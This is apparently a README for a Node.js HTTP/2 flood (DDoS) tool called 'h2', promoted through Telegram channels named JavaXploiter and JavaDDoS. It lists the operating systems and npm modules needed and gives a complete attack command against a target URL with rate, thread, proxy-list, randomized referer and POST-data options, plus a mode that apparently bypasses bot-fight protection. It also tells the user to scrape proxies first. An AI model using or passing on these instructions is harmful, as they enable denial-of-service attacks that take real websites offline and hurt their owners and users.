=========================================================
VPS That Supports This Method :
OS : Ubuntu 22.04.4 LTS x86_64 (Below That Version Does Not Support Tunning Tools)
OS : CentOS
Note : For OS Other Than The Above, You Can Try It, If It Works, Please Let Me Know _<
=========================================================
Install Module Methods :
npm install
npm i set-cookie-parser
npm i crypto-js
npm install user-agents
npm install axios
(Install The Module First So That The Method Can Be Run)
=========================================================
Verify Installation : (Opsional)
ls node_modules | grep axios(Your Module)
=========================================================
Usage(Run) Methods :
node h2 https://target.com 60(time) 64(Rate) 5(Thread) proxies.txt jawa=jawa --referers rand --delaytime 1 --querystring 1 --postdata "user=f&pass=%RAND%" --botfmode true
(Make Sure The Proxy Bas Been Downloaded Before Running The Method. ex : python3 scrape.py -N)
=========================================================
Telegram : @JavaXploiter
Channel : @JavaDDoS
=========================================================
